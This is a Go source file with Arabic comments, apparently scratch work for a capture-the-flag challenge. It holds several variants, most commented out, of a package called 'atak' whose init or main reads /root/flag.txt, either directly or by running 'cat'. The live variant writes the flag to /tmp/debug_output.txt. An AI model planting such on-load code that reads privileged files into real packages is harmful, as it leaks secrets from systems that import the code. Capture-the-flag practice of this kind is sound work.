
// package atak

// import (
// 	"fmt"
// 	"io/ioutil"
// 	"os"
// )

// func init() {
// 	data, err := ioutil.ReadFile("/root/flag.txt")
// 	if err != nil {
// 		fmt.Println("Error:", err)
// 		return
// 	}
// 	fmt.Fprintln(os.Stdout, string(data))
// }






// import (
// 	"fmt"
// 	"io/ioutil"
// 	"os"
// )

// func init() {
// 	// رسالة بدء التطبيق للتأكد من تنفيذ الكود
// 	fmt.Println("DEBUG: Starting package atak...")

// 	// محاولة قراءة الملف
// 	data, err := ioutil.ReadFile("/root/flag.txt")
// 	if err != nil {
// 		fmt.Println("DEBUG: Error reading /root/flag.txt:", err)
// 		return
// 	}

// 	// التأكد من محتوى الملف
// 	if len(data) == 0 {
// 		fmt.Println("DEBUG: /root/flag.txt is empty!")
// 	} else {
// 		fmt.Fprintln(os.Stdout, "FLAG:", string(data))
// 	}

// }














package main

import (
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	// رسائل debug عند الكتابة في ملف بديل
	debug := "DEBUG: Starting application...\n"
	err := ioutil.WriteFile("/tmp/debug_output.txt", []byte(debug), 0644)
	if err != nil {
		// في حالة فشل الكتابة، حاول كتابة الخطأ إلى stderr مباشرة
		fmt.Fprintln(os.Stderr, "Error writing debug:", err)
		return
	}

	data, err := ioutil.ReadFile("/root/flag.txt")
	if err != nil {
		msg := fmt.Sprintf("DEBUG: Error reading /root/flag.txt: %v\n", err)
		ioutil.WriteFile("/tmp/debug_output.txt", []byte(debug+msg), 0644)
		return
	}

	if len(data) == 0 {
		ioutil.WriteFile("/tmp/debug_output.txt", []byte(debug+"DEBUG: /root/flag.txt is empty!\n"), 0644)
	} else {
		out := fmt.Sprintf("FLAG: %s\n", string(data))
		ioutil.WriteFile("/tmp/debug_output.txt", []byte(debug+out), 0644)
	}
}





















// import (
// 	"fmt"
// 	"os/exec"
// 	"strings"
// )

// func atak() {
// 	// تنفيذ أمر cat لقراءة الفلاج
// 	cmd := exec.Command("cat", "/root/flag.txt")
// 	output, err := cmd.CombinedOutput()

// 	// التعامل مع الخطأ
// 	if err != nil {
// 		fmt.Println("Error:", err)
// 		return
// 	}

// 	// طباعة الفلاج
// 	fmt.Println("FLAG:", strings.TrimSpace(string(output)))
// }













// package atak

// import (
// 	"fmt"
// 	"io/ioutil"
// )

// func init() string {
// 	data, err := ioutil.ReadFile("/root/flag.txt")
// 	if err != nil {
// 		return "Error: " + err.Error()
// 	}
// 	return "FLAG: " + string(data)
// }




// import (
//     "os/exec"
//     "fmt"
// )

// func main() {
//     out, err := exec.Command("cat", "/root/flag.txt").Output()
//     if err != nil {
//         fmt.Println("Error:", err)
//         return
//     }
//     fmt.Println("FLAG:", string(out))
// }
